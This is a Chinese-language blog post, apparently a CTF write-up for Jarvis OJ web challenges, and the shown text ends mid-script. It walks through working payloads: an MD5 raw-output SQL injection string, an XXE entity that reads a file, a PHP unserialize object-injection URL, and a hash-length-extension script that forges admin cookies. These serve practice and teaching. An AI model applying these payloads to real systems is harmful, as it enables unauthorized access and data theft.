@@ -1,0 +1,1216 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="ctf,writeup," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Cyris | 绿生" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.png?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="这里记录一些jarvis oj上的题。">
+<meta name="keywords" content="ctf,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jarvis OJ Writeup">
+<meta property="og:url" content="https://iCyris.github.io/2017/11/04/jarvisoj-wp/index.html">
+<meta property="og:site_name" content="Cyris | 绿生">
+<meta property="og:description" content="这里记录一些jarvis oj上的题。">
+<meta property="og:image" content="https://icyris.github.io/2017/11/04/jarvisoj-wp/1.png">
+<meta property="og:updated_time" content="2018-02-02T15:04:19.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Jarvis OJ Writeup">
+<meta name="twitter:description" content="这里记录一些jarvis oj上的题。">
+<meta name="twitter:image" content="https://icyris.github.io/2017/11/04/jarvisoj-wp/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://iCyris.github.io/2017/11/04/jarvisoj-wp/"/>
+
+
+
+
+
+  <title>Jarvis OJ Writeup | Cyris | 绿生</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cyris | 绿生</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sun-o"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-folder"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-external-link"></i> <br />
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://iCyris.github.io/2017/11/04/jarvisoj-wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Cyris">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/cyris.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cyris | 绿生">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Jarvis OJ Writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-04T11:23:21+08:00">
+                2017-11-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这里记录一些jarvis oj上的题。</p>
+<a id="more"></a> 
+<hr>
+<h2 id="Web部分"><a href="#Web部分" class="headerlink" title="Web部分"></a>Web部分</h2><h3 id="0x01-Login"><a href="#0x01-Login" class="headerlink" title="0x01 Login"></a>0x01 Login</h3><p>需要密码才能获得flag哦。     </p>
+<p>题目入口：<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="external">http://web.jarvisoj.com:32772/</a></p>
+<p>在 Headers 里找到一条hint：<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Hint:"<span class="keyword">select</span> * <span class="keyword">from</span> <span class="symbol">`admin`</span> <span class="keyword">where</span> <span class="keyword">password</span>=<span class="string">'".md5($pass,true)."'</span><span class="string">"</span></div></pre></td></tr></table></figure></p>
+<p>涉及到一个MD5加密后的注入问题。    </p>
+<p>关于这条md5语句我们先来看下php手册中的描述：</p>
+<blockquote>
+<p><strong>Description</strong></p>
+<p>string md5 ( string str [, bool raw_output] )</p>
+<p>Calculates the MD5 hash of str using the RSA Data Security, Inc. MD5 Message-Digest Algorithm, and returns that hash. The hash is a 32-character hexadecimal number. If the optional raw_output is set to TRUE, then the md5 digest is instead returned in raw binary format with a length of 16.</p>
+<p>注: The optional raw_output parameter was added in PHP 5.0.0 and defaults to FALSE</p>
+</blockquote>
+<p>也就是说，如果md5后的hex转换成字符串后，若包含 <code>&#39;or&#39;&lt;trash&gt;</code> 这样的字符串，那整个sql语句就会变成：   </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM admin WHERE <span class="keyword">pass</span> = <span class="string">''</span>o<span class="string">r'&lt;trash&gt;'</span></div></pre></td></tr></table></figure>
+<p>就可以进行注入了。   </p>
+<p>网上找到一个字符串：<code>ffifdyop</code></p>
+<p>md5以后：<code>276f722736c95d99e921722cf9ed621c</code></p>
+<p>再转换成字符串即为<code>&#39;or&#39;&lt;trash&gt;</code>  </p>
+<p>这题把上面这个字符串作为 password 传入即可。  </p>
+<hr>
+<h3 id="0x02-api调用"><a href="#0x02-api调用" class="headerlink" title="0x02 api调用"></a>0x02 api调用</h3><p>请设法获得目标机器/home/ctf/flag.txt中的flag值。</p>
+<p>题目入口：<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="external">http://web.jarvisoj.com:9882/</a></p>
+<p>直接能看到源码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">XHR</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> xhr;</div><div class="line">        <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> XMLHttpRequest();&#125;</div><div class="line">        <span class="keyword">catch</span>(e) &#123;</div><div class="line">            <span class="keyword">var</span> IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>,len=IEXHRVers.length;i&lt; len;i++) &#123;</div><div class="line">                <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> ActiveXObject(IEXHRVers[i]);&#125;</div><div class="line">                <span class="keyword">catch</span>(e) &#123;<span class="keyword">continue</span>;&#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> xhr;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</div><div class="line"> evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</div><div class="line"> <span class="keyword">var</span> xhr = XHR();</div><div class="line">     xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</div><div class="line">     xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">         <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</div><div class="line">             data = <span class="built_in">JSON</span>.parse(xhr.responseText);</div><div class="line">             tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</div><div class="line">             tip_area.value = data.task.search+data.task.value;</div><div class="line">         &#125;</div><div class="line">     &#125;;</div><div class="line">     xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</div><div class="line">     xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</div><div class="line">&#125;</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
+<p>光看这个没找到什么特别的东西，搜了一些资料发现这题是关于<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">XXE漏洞</a>，简单地说就是利用 <code>xml</code> 中的 <code>Entity</code> 实体来读取文件或者执行系统命令等，以造成攻击。  </p>
+<p>这题里先把 <code>Content-Type</code> 改成 <code>application/xml</code>，然后构造：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE xdsec [</span></div><div class="line">&lt;!ELEMENT methodname ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM "/home/ctf/flag.txt" &gt;]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">methodcall</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">methodname</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">methodname</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">methodcall</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>就可以获取flag了。</p>
+<hr>
+<h3 id="0x03-神盾局的秘密"><a href="#0x03-神盾局的秘密" class="headerlink" title="0x03 神盾局的秘密"></a>0x03 神盾局的秘密</h3><p>这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？</p>
+<p>题目入口：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="external">http://web.jarvisoj.com:32768/</a></p>
+<p>扫了一下目录，只发现了 <code>showing.php</code> 和 <code>index.php</code>。</p>
+<p>查看源码发现</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>感觉像文件包含，但是现在除了这张图外没有别的能利用的东西，试着读取 <code>showing.php</code> 本身：</p>
+<p><img src="/2017/11/04/jarvisoj-wp/1.png" alt=""></p>
+<p>可以看到源码，过滤了 <code>pctf</code> 。但是没什么利用方式，如果直接查看 <code>/pctf.php</code> 拿到的是假flag。同样的方式读取 <code>index.php</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">    <span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</div><div class="line">    $x = <span class="keyword">new</span> Shield();</div><div class="line">    <span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</div><div class="line">        $x = unserialize($g);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">echo</span> $x-&gt;readfile();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>然后拿到 <code>shield.php</code> 的源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="comment">//flag is in pctf.php</span></div><div class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</div><div class="line">        <span class="keyword">public</span> $file;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</div><div class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</div><div class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) </div><div class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </div><div class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span></div><div class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</div><div class="line">                <span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p><code>shield.php</code> 中说flag在 <code>pctf.php</code> 里，但是在 <code>showing.php</code> 中被过滤了，所以直接读它拿到的是假flag。留意到 <code>index.php</code> 里用了反序列化，可以利用这点构造payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</div><div class="line">        <span class="keyword">public</span> $file;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</div><div class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    $a = <span class="keyword">new</span> Shield();</div><div class="line">    $a-&gt;file = <span class="string">"pctf.php"</span>;</div><div class="line">    <span class="keyword">echo</span> serialize($a);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>序列化后的结果为：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:6</span><span class="selector-pseudo">:"Shield"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"file"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</div></pre></td></tr></table></figure>
+<p>利用 <code>index.php</code> 中的 <code>class</code> 参数传入payload然后再反序列化就可以拿到flag了。</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:<span class="number">32768</span>/?class=O:<span class="number">6</span>:<span class="string">"Shield"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--?php </span></div><div class="line">    //Ture Flag : PCTF&#123;W3lcome_To_Shi3ld_secret_Ar3a&#125;</div><div class="line">    //Fake flag:</div><div class="line">    echo "FLAG: PCTF&#123;I_4m_not_fl4g&#125;"</div><div class="line">?--&gt;</div></pre></td></tr></table></figure>
+<hr>
+<h3 id="0x04-flag在管理员手里"><a href="#0x04-flag在管理员手里" class="headerlink" title="0x04 flag在管理员手里"></a>0x04 flag在管理员手里</h3><p>只有管理员才能获得flag，你能想办法获得吗？</p>
+<p>题目链接：<a href="http://web.jarvisoj.com:32778/" target="_blank" rel="external">http://web.jarvisoj.com:32778/</a></p>
+<p>vim备份文件泄露（ <code>/index.php~</code> ），恢复后拿到源码（题目有点问题，<code>vim -r</code> 一直失败，想强行手动恢复但是感觉没啥意义…就直接搜了原题的源码贴上来了）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;  </div><div class="line">    &lt;head&gt;</div><div class="line">        &lt;title&gt;Web <span class="number">350</span>&lt;/title&gt;</div><div class="line">        &lt;style type=<span class="string">"text/css"</span>&gt;</div><div class="line">            body &#123;</div><div class="line">                background:gray;</div><div class="line">                text-align:center;  </div><div class="line">            &#125;</div><div class="line">        &lt;/style&gt;</div><div class="line">    &lt;/head&gt; </div><div class="line">    &lt;body&gt;</div><div class="line">        <span class="meta">&lt;?php</span></div><div class="line">            $auth = <span class="keyword">false</span>;</div><div class="line">            $role = <span class="string">"guest"</span>;   </div><div class="line">            $salt = ;</div><div class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</div><div class="line">                $role = unserialize($_COOKIE[<span class="string">"role"</span>]);</div><div class="line">                $hsh = $_COOKIE[<span class="string">"hsh"</span>];</div><div class="line">                <span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;    </div><div class="line">                    $auth = <span class="keyword">true</span>;</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">else</span> &#123;</div><div class="line">                    $auth = <span class="keyword">false</span>;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;&#125;   </div><div class="line">                $s = serialize($role);</div><div class="line">                setcookie(<span class="string">'role'</span>,$s);</div><div class="line">                $hsh = md5($salt.strrev($s));</div><div class="line">                setcookie(<span class="string">'hsh'</span>,$hsh);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> ($auth) &#123;</div><div class="line">                <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is "</span></div><div class="line">            &#125; </div><div class="line">            <span class="keyword">else</span> &#123;</div><div class="line">                <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"</span>;  </div><div class="line">            &#125;</div><div class="line">        <span class="meta">?&gt;</span>  </div><div class="line">    &lt;/body&gt; </div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<p>核心语句为：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash">role===<span class="string">"admin"</span> &amp;&amp; <span class="variable">$hsh</span> === md5(<span class="variable">$salt</span>.strrev(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]))</span></div></pre></td></tr></table></figure></p>
+<p>查了些资料，发现可以使用 <code>哈希长度扩展攻击</code> 。</p>
+<p>做题的时候整理了一下这里涉及的知识点 - <a href="http://blog.cyris.cn/2018/02/02/hash-extender-attack/" target="_blank" rel="external">传送门</a></p>
+<p>利用工具：</p>
+<blockquote>
+<p><a href="https://github.com/bwall/HashPump" target="_blank" rel="external">HashPump</a><br><a href="https://github.com/iagox86/hash_extender" target="_blank" rel="external">hash_extender</a></p>
+</blockquote>
+<p>已有条件：<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Cookie-hsh：<span class="number">3</span>a<span class="number">4727</span>d<span class="number">57463</span>f<span class="number">122833</span>d<span class="number">9</span>e<span class="number">732</span>f<span class="number">94</span>e<span class="number">4</span>e<span class="number">0</span></div><div class="line">Cookie-role：s<span class="meta">%</span><span class="number">3</span>A<span class="number">5</span><span class="meta">%</span><span class="number">3</span>A<span class="meta">%</span><span class="number">22</span>guest<span class="meta">%</span><span class="number">22</span><span class="meta">%</span><span class="number">3</span>B</div><div class="line">需要求：md<span class="number">5</span><span class="comment">(salt+strrev(admin)</span>)</div><div class="line">* salt长度未知</div></pre></td></tr></table></figure></p>
+<p>这里我用的是 hash_extender （需要make一下），因为 mac 最新的 openssl 库就是装不上….丢去服务器上跑了，salt 长度未知，贴一份脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlparse</div><div class="line"><span class="keyword">from</span> httplib <span class="keyword">import</span> HTTPConnection</div><div class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> urlencode</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gao</span><span class="params">(x, y)</span>:</span></div><div class="line">        <span class="comment">#print x</span></div><div class="line">        <span class="comment">#print y</span></div><div class="line">    url = <span class="string">"http://web.jarvisoj.com:32778/index.php"</span></div><div class="line">    cookie = <span class="string">"role="</span> + x + <span class="string">"; hsh="</span> + y</div><div class="line">        <span class="comment">#print cookie</span></div><div class="line">    build_header = &#123;</div><div class="line">            <span class="string">'Cookie'</span>: cookie,</div><div class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0'</span>,</div><div class="line">            <span class="string">'Host'</span>: <span class="string">'web.jarvisoj.com:32778'</span>,</div><div class="line">            <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</div><div class="line">    &#125;</div><div class="line">    urlparts = urlparse(url)</div><div class="line">    conn = HTTPConnection(urlparts.hostname, urlparts.port <span class="keyword">or</span> <span class="number">80</span>)</div><div class="line">    conn.request(<span class="string">"GET"</span>, urlparts.path, <span class="string">''</span>, build_header)</div><div class="line">    resp = conn.getresponse()</div><div class="line">    body = resp.read()</div><div class="line">    <span class="keyword">return</span> body</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1000</span>):</div><div class="line">    <span class="keyword">print</span> i</div><div class="line">    <span class="comment"># secret len = ???</span></div><div class="line">    find_hash = <span class="string">"./hash_extender -d ';\"tseug\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ';\"nimda\":5:s' --out-data-format=html -l "</span> + str(i) + <span class="string">" --quiet"</span></div><div class="line">    <span class="comment">#print find_hash</span></div><div class="line">    calc_res = os.popen(find_hash).readlines()</div><div class="line">    hash_value = calc_res[<span class="number">0</span>][:<span class="number">32</span>]</div><div class="line">    attack_padding = calc_res[<span class="number">0</span>][<span class="number">32</span>:]</div><div class="line">    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::<span class="number">-1</span>])</div><div class="line">    ret = gao(attack_padding, hash_value)</div><div class="line">    <span class="keyword">if</span> <span class="string">"Welcome"</span> <span class="keyword">in</span> 